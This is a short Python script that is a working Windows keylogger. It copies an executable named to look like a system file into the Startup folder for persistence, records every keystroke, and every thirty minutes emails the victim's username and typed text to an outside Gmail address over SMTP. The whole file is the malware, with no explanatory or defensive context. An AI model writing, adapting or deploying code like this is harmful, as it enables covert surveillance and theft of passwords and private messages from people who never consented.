import keyboard as key
import os
import winshell
import smtplib
import time
import os
import shutil

from email.mime.text import MIMEText



server = smtplib.SMTP("smtp.gmail.com",587)
server.starttls()
sender = "name@gmail.com"
password = "12345"
server.login(sender, password)
#get autostart folder
startup = winshell.startup()

print(startup)
#get folder
file_path = os.getcwd()+"\\systemThY30.exe"

if(os.path.exists(startup+"\\systemThY64.exe")):
    os.remove(startup+"\\systemThY64.exe")
if(file_path != startup and os.path.exists(startup) and os.path.exists(file_path)):
    shutil.copy(file_path,startup)

#start listen
key.start_recording()

#send to me


def timer():
    while True:
        time.sleep(1800)
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(sender, password)
        msg = MIMEText(f"User name = {str(os.getlogin())} \n text = {str(list(key.get_typed_strings(key.stop_recording())))}","plain","utf-8")
        server.sendmail(sender, "name2@gmail.com",msg.as_string())
        print("send")
        key.start_recording()
        



timer()
